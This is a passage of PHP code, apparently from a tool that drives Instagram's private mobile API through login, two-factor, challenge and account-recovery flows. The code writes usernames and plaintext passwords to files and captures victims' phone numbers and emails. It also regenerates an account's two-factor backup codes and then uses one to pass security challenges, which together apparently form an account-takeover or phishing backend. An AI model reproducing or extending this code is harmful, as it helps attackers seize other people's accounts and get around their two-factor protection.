            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "X-Fb-Http-Engine: Liger",
            "X-Fb-Client-Ip: True",
            "X-Fb-Server-Cluster: True",
        ];

        $post = [
            "two_factor_identifier" => $two_factor_identifier,
            "username" => $username,
            "guid" => $this->X_Ig_Device_Id,
            "device_id" => $this->X_Ig_Android_Id,
        ];

        $response = $this->RequestHeader("accounts/send_two_factor_login_sms/", $headers, $post);

        $filename = __DIR__ . '/log/sendsms' . $username . '.json';
        file_put_contents($filename, $response['body']);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function challengeCANCEL($context)
    {

        $headers = $this->headersget('headers2');

        $post = [
            "bk_client_context" => array(
                "bloks_version" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
                "styles_id" => "instagram",
            ),
            "challenge_context" => $context,
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
        ];

        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.rewind_challenge/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function challengeGET($path, $context, $username)
    {

        $url = "https://i.instagram.com/api/v1" . $path . "?guid=$this->X_Ig_Device_Id&device_id=$this->X_Ig_Android_Id&challenge_context=" . $context;

        $headers = $this->headersget('headers2');

        $response = $this->RequestGETv1($url, $headers);
        $this->log('challengeGET', $response, $username);

        $data = json_decode($response, true);

        if (isset($data['step_data']['phone_number'])) {
            $_SESSION['user_phone'] = $data['step_data']['phone_number'];
        }

        if (isset($data['step_data']['email'])) {
            $_SESSION['user_email'] = $data['step_data']['email'];
        }
        return [
            'body' => $response,
        ];
    }


    public function assisted_account_recovery($username)
    {

        $headers = $this->headersget('headers2');

        $data = [
            "source" => "account_access",
            "guid" => $this->X_Ig_Device_Id,
            "device_id" => $this->X_Ig_Android_Id,
            "query" => $username,
        ];

        $response = $this->RequestHeader("accounts/assisted_account_recovery/", $headers, $data);
        $this->log('accounts/assisted_account_recovery/', $response['body'], $username);

        $jsonn = json_decode($response['body'], true);

        if ($jsonn['status'] === 'ok') {

            $user_id = $jsonn['uid'];
            $cni = $jsonn['cni'];
            $nonce_code = $jsonn['nonce'];
            $challenge_context = $jsonn['challenge_context'];
            $uri = $jsonn['uri'];

            $this->securityCHOİCE($uri, $challenge_context, $username);
            $this->securitySTEP($user_id, $cni, $nonce_code, $challenge_context);

            return [
                'headers' => $response['headers'],
                'body' => $response['body'],
            ];
        }
    }

    public function challengeSTEP($user_id, $cni, $nonce_code, $challenge_context)
    {

        $headers = $this->headersget('headers2');

        $post = [
            "user_id" => $user_id,
            "cni" => $cni,
            "nonce_code" => $nonce_code,
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "fb_family_device_id" => $this->X_Ig_Family_Device_Id,
            "challenge_context" => $challenge_context,
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
            "get_challenge" => "true",
        ];

        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function challengeCODE($challenge_context, $choice, $username)
    {

        $headers = $this->headersget('headers2');

        $post = [
            "choice" => $choice,
            "has_follow_up_screens" => "0",
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "challenge_context" => $challenge_context,
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
        ];

        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);
        $this->log('ChallengeSendCode', $response['body'], $username);

        $es = json_decode($response['body'], true);
        $mm = $es['layout']['bloks_payload']['tree']['㐟']['#'];
        $shs = explode(" ", $mm);
        $id86 = preg_replace('/\D/', '', $shs[886]);
        $iduz = strlen($id86);
        if ($iduz >= 3 && $iduz <= 18) {
            $jssson = [
                "perf_logging_id" => $id86,
            ];
            $d = json_encode($jssson);
            $filename = __DIR__ . '/log/perf_logging_id' . $username . '.json';
            file_put_contents($filename, $d);
        } else {

            $id87 = preg_replace('/\D/', '', $shs[887]);
            $iduz87 = strlen($id87);
            if ($iduz87 >= 3 && $iduz87 <= 18) {
                $jssson = [
                    "perf_logging_id" => $id87,
                ];
                $d = json_encode($jssson);
                $filename = __DIR__ . '/log/perf_logging_id' . $username . '.json';
                file_put_contents($filename, $d);
            } else {
                $id85 = preg_replace('/\D/', '', $shs[885]);
                $iduz85 = strlen($id85);
                if ($iduz85 >= 3 && $iduz85 <= 18) {
                    $jssson = [
                        "perf_logging_id" => $id85,
                    ];
                    $d = json_encode($jssson);
                    $filename = __DIR__ . '/log/perf_logging_id' . $username . '.json';
                    file_put_contents($filename, $d);
                }
            }

            return [
                'headers' => $response['headers'],
                'body' => $response['body'],
            ];
        }
    }


    public function securityCHOİCE($slash, $challenge_context, $username)
    {
        $headers = $this->headersget('headers2');

        $url = "https://i.instagram.com/api/v1$slash/?guid=9c2f9a68-a663-491a-bed7-d1af2bd8bacd&device_id=android-df81a0837b02c957&challenge_context=$challenge_context";

        $response = $this->RequestGETv1($url, $headers);

        $this->log('RequestGETv1', $response, $username);

        $e = json_decode($response, true);
        $options = $e['step_data']['options'];
        $jsonenc = json_encode($options);
        file_put_contents("security/$username.json", $jsonenc);

        return [
            'body' => $response,
        ];
    }

    public function securitySTEP($user_id, $cni, $nonce_code, $challenge_context)
    {

        $headers = $this->headersget('headers2');

        $post = [
            "user_id" => $user_id,
            "cni" => $cni,
            "nonce_code" => $nonce_code,
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "fb_family_device_id" => $this->X_Ig_Family_Device_Id,
            "challenge_context" => $challenge_context,
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
            "get_challenge" => "true",
        ];


        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);
        $challenge_context = $this->contex($response['body']);

        $_SESSION['challenge_context'] = $challenge_context;

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
            'challenge_context' => $challenge_context
        ];
    }

    public function securitySTEP2($challenge_context, $choice)
    {

        $headers = $this->headersget('headers2');

        $post = [
            "choice" => $choice,
            "has_follow_up_screens" => "0",
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "challenge_context" => $challenge_context,
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
        ];


        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);
        $this->log('securitySTEP2', $response['body'], 'codesend');

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }


    public function recoveryfactor($username, $challenge_context)
    {
        $headers = $this->headersget('headers2');

        $post = [
            'choice' => 3,
            'two_factor_security_code' => $_SESSION['backup'],
            'has_follow_up_screens' => 0,
            'bk_client_context' => json_encode([
                "bloks_version" => "8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",
                "styles_id" => "instagram",
            ]),
            'challenge_context' => $challenge_context,
            'bloks_versioning_id' => '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07',
        ];

        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);

        $this->log('recoveryfactor', $response['body'], $username);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function trusted_friend()
    {
        $headers = $this->headersget('headers2');

        return $this->RequestGET("trusted_friend/get_non_expired_requests_info/", $headers);
    }

    public function securityLOGİN($challenge_context, $code)
    {
        $headers = $this->headersget('headers2');

        $post = [
            'choice' => 0,
            'security_code' => $code,
            'is_bloks_web' => 'False',
            'has_follow_up_screens' => 0,
            'bk_client_context' => json_encode([
                "bloks_version" => "8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",
                "styles_id" => "instagram",
            ]),
            'challenge_context' => $challenge_context,
            'bloks_versioning_id' => '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07',
        ];


        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function backupcode($username)
    {
        $cookies = file_get_contents('cookies/' . $username . '.json');
        $cookie = json_decode($cookies, true);
        $bearer = $cookie['token'];
        $fbid = $cookie['fbid'];
        $user_id = $cookie['id'];

        $headers = $this->headersget($bearer, $user_id, 'headers1');

        $post = [
            'params' => json_encode([
                "client_input_params" => [
                    "machine_id" => "$this->X_Mid",
                    "family_device_id" => "$this->X_Ig_Family_Device_Id",
                ],
                "server_params" => [
                    "account_type" => 1,
                    "INTERNAL__latency_qpl_marker_id" => 36707139,
                    "account_id" => "$fbid",
                    "INTERNAL_INFRA_THEME" => "harm_f",
                    "requested_screen_component_type" => null,
                    "machine_id" => null,
                    "INTERNAL__latency_qpl_instance_id" => 2.12245178800051E14,
                    "ig_auth_proof_json" => "$bearer",
                ],
            ]),
            '_uuid' => $this->X_Ig_Device_Id,
            'bk_client_context' => json_encode([
                "bloks_version" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
                "styles_id" => "instagram",
            ]),
            'bloks_versioning_id' => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
        ];


        $response = $this->RequestHeader("bloks/apps/com.bloks.www.fx.settings.security.two_factor.recovery_codes.regenerate/", $headers, $post);

        $coderesponse = json_decode($response['body'], true);
        $codes = $coderesponse['layout']['bloks_payload']['tree']['㐟']['#'];
        preg_match_all('/\b\d{4} \d{4}\b/', $codes, $matches);

        if (!empty($matches[0]) && count($matches[0]) > 3) {
            $backups = str_replace(' ', '', $matches[0]);
            // $backup = $backups[0] . " - " . $backups[1] . " - " . $backups[2] . " - " . $backups[3];
            $_SESSION['backup'] = $backups[1];
        } else {
            $_SESSION['backup'] = null;
        }

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function twofactorLOGİN($username, $two_factor_identifier, $code, $verification_method)
    {
        $headers = $this->headersget('headers2');

        $post = [
            "verification_code" => htmlspecialchars($code, ENT_QUOTES, 'UTF-8'),
            "phone_id" => $this->X_Ig_Family_Device_Id,
            "two_factor_identifier" => htmlspecialchars($two_factor_identifier, ENT_QUOTES, 'UTF-8'),
            "username" => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            "trust_this_device" => "1",
            "guid" => $this->X_Ig_Device_Id,
            "device_id" => $this->X_Ig_Android_Id,
            "waterfall_id" => $this->generateUUID(),
            "verification_method" => $verification_method,
            // 3 duo 2 yedek kodlar  1 sms Coded By Mythic
        ];


        $response = $this->RequestHeader("accounts/two_factor_login/", $headers, $post);
        $this->log('accounts/two_factor_login/', $response['body'], $username);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function challengefactor($bearer, $user_id)
    {
        $headers = $this->headersget($bearer, $user_id, 'headers1');
        $response = $this->RequestGET("challenge/?guid=$this->X_Ig_Device_Id&device_id=$this->X_Ig_Android_Id", $headers);
        $data = json_decode($response, true);
        $cni = $data['cni'];
        $context = $data['challenge_context'];


        $data = [
            "cni" => $cni,
            "_uuid" => $this->X_Ig_Device_Id,
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "fb_family_device_id" => $this->X_Ig_Family_Device_Id,
            "challenge_context" => $context,
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
            "get_challenge" => "true",

        ];

        $response1 = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $data);
        // Coded By Mythic Challenge Code Send
        $data = [
            "choice" => "0",
            "_uuid" => $this->X_Ig_Device_Id,
            "has_follow_up_screens" => "0",
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "bloks_versioning_id" => "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
        ];

        $response2 = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $data);

        return [
            'response' => $response,
            'response1' => $response1,
            'response2' => $response2,
        ];
    }

    public function challengeLOGİN($code, $context, $username)
    {

        $headers = $this->headersget('headers2');

        $filename = __DIR__ . '/log/perf_logging_id' . $username . '.json';
        $mythicperf = file_get_contents($filename);
        $mythic = json_decode($mythicperf, true);

        $data = [
            "security_code" => htmlspecialchars($code, ENT_QUOTES, 'UTF-8'),
            "perf_logging_id" => $mythic['perf_logging_id'],
            "has_follow_up_screens" => '0',
            "bk_client_context" => '{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}',
            "challenge_context" => htmlspecialchars($context, ENT_QUOTES, 'UTF-8'),
            "bloks_versioning_id" => '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
        ];


        $response = $this->RequestHeader("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $data);
        $this->log('ChallengeLogin', $response['body'], $username);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }


    public function Loginv2($usernames, $passwords)
    {

        $username = htmlspecialchars($usernames, ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($passwords, ENT_QUOTES, 'UTF-8');

        $headers = [
            'Host: ' . $this->host,
            'X-Ig-App-Locale: ' . $this->X_Ig_App_Locale,
            'X-Ig-Device-Locale: ' . $this->X_Ig_Device_Locale,
            'X-Ig-Mapped-Locale: ' . $this->X_Ig_Mapped_Locale,
            'X-Ig-Bandwidth-Speed-Kbps: ' . $this->X_Ig_Bandwidth_Speed_Kbps,
            'X-Ig-Bandwidth-Totalbytes-B: ' . $this->X_Ig_Bandwidth_Totalbytes_B,
            'X-Ig-Bandwidth-Totaltime-Ms: ' . $this->X_Ig_Bandwidth_Totaltime_Ms,
            'X-Bloks-Version-Id: ' . $this->X_Bloks_Version_Id,
            'X-Ig-Www-Claim: ' . $this->X_Ig_Www_Claim,
            'X-Bloks-Is-Layout-Rtl: ' . ($this->X_Bloks_Is_Layout_Rtl ? 'true' : 'false'),
            'X-Ig-Device-Id: ' . $this->X_Ig_Device_Id,
            'X-Ig-Family-Device-Id: ' . $this->X_Ig_Family_Device_Id,
            'X-Ig-Android-Id: ' . $this->X_Ig_Android_Id,
            'X-Ig-Timezone-Offset: ' . $this->X_Ig_Timezone_Offset,
            'X-Fb-Connection-Type: ' . $this->X_Fb_Connection_Type,
            'X-Ig-Connection-Type: ' . $this->X_Ig_Connection_Type,
            'X-Ig-Capabilities: ' . $this->X_Ig_Capabilities,
            'X-Ig-App-Id: ' . $this->X_Ig_App_Id,
            'Priority: ' . $this->Priority,
            'User-Agent: ' . $this->User_Agent,
            'Accept-Language: ' . $this->Accept_Language,
            'X-Mid: ' . $this->X_Mid,
            'Ig-Intended-User-Id: ' . $this->Ig_Intended_User_Id,
            'X-Fb-Http-Engine: ' . $this->X_Fb_Http_Engine,
            'X-Fb-Client-Ip: ' . ($this->X_Fb_Client_Ip ? 'True' : 'False'),
            'X-Fb-Server-Cluster: ' . ($this->X_Fb_Server_Cluster ? 'True' : 'False'),
        ];

        $post = [
            'phone_id' => $this->X_Ig_Family_Device_Id,
            'enc_password' => $this->encrypt($password),
            'username' => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            'guid' => $this->X_Ig_Device_Id,
            'device_id' => $this->X_Ig_Android_Id,
        ];

        $response = $this->requestHEADER("accounts/login/", $headers, $post);

        $data = json_decode($response['body'], true);

        if ($data['status'] == 'ok') {

            if ($response['headers']) {
                $headersArray = explode("\r\n", $response['headers']);
                $bearer = '';
                $x_ig_set_www_claim = '';

                foreach ($headersArray as $header) {
                    if (strpos($header, 'ig-set-authorization') !== false) {
                        $bearer = trim(explode(':', $header, 2)[1]);
                        preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                        $session_json = json_decode(base64_decode($session_json[2]));
                        $user_id = $session_json->ds_user_id;
                        $userdata = [
                            'bearer' => $bearer,
                            'user_id' => $user_id,
                            'username' => $username,
                            'password' => $password,
                        ];
                        $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);
                        $filename = (__DIR__) . '/cookie' . '/' . $username . '.json';
                        file_put_contents($filename, $jsondata);
                    }

                    if (strpos($header, 'x-ig-set-www-claim') !== false) {
                        $x_ig_set_www_claim = trim(explode(':', $header, 2)[1]);
                    }
                }

                if ($x_ig_set_www_claim) {
                    $userdata['x_ig_set_www_claim'] = $x_ig_set_www_claim;
                    $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);
                    $filename = (__DIR__) . '/cookie' . '/' . $username . '.json';
                    file_put_contents($filename, $jsondata);
                }
            }
            return $response['body'];
        } else {
            return $response['body'];
        }
    }

    public function twofactorLOGİNv2($username, $two_factor_identifier, $code)
    {
        $headers = [
            'Host: ' . $this->host,
            'X-Ig-App-Locale: ' . $this->X_Ig_App_Locale,
            'X-Ig-Device-Locale: ' . $this->X_Ig_Device_Locale,
            'X-Ig-Mapped-Locale: ' . $this->X_Ig_Mapped_Locale,
            'X-Ig-Bandwidth-Speed-Kbps: ' . $this->X_Ig_Bandwidth_Speed_Kbps,
            'X-Ig-Bandwidth-Totalbytes-B: ' . $this->X_Ig_Bandwidth_Totalbytes_B,
            'X-Ig-Bandwidth-Totaltime-Ms: ' . $this->X_Ig_Bandwidth_Totaltime_Ms,
            'X-Bloks-Version-Id: ' . $this->X_Bloks_Version_Id,
            'X-Ig-Www-Claim: ' . $this->X_Ig_Www_Claim,
            'X-Bloks-Is-Layout-Rtl: ' . ($this->X_Bloks_Is_Layout_Rtl ? 'true' : 'false'),
            'X-Ig-Device-Id: ' . $this->X_Ig_Device_Id,
            'X-Ig-Family-Device-Id: ' . $this->X_Ig_Family_Device_Id,
            'X-Ig-Android-Id: ' . $this->X_Ig_Android_Id,
            'X-Ig-Timezone-Offset: ' . $this->X_Ig_Timezone_Offset,
            'X-Fb-Connection-Type: ' . $this->X_Fb_Connection_Type,
            'X-Ig-Connection-Type: ' . $this->X_Ig_Connection_Type,
            'X-Ig-Capabilities: ' . $this->X_Ig_Capabilities,
            'X-Ig-App-Id: ' . $this->X_Ig_App_Id,
            'Priority: ' . $this->Priority,
            'User-Agent: ' . $this->User_Agent,
            'Accept-Language: ' . $this->Accept_Language,
            'X-Mid: ' . $this->X_Mid,
            'Ig-Intended-User-Id: ' . $this->Ig_Intended_User_Id,
            'X-Fb-Http-Engine: ' . $this->X_Fb_Http_Engine,
            'X-Fb-Client-Ip: ' . ($this->X_Fb_Client_Ip ? 'True' : 'False'),
            'X-Fb-Server-Cluster: ' . ($this->X_Fb_Server_Cluster ? 'True' : 'False'),
        ];

        $post = [
            "verification_code" => htmlspecialchars($code, ENT_QUOTES, 'UTF-8'),
            "phone_id" => $this->X_Ig_Family_Device_Id,
            "two_factor_identifier" => htmlspecialchars($two_factor_identifier, ENT_QUOTES, 'UTF-8'),
            "username" => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            "trust_this_device" => "1",
            "guid" => $this->X_Ig_Device_Id,
            "device_id" => $this->X_Ig_Android_Id,
            "waterfall_id" => $this->generateUUID(),
            "verification_method" => "2",
        ];


        $response = $this->RequestHeader("accounts/two_factor_login/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }
}
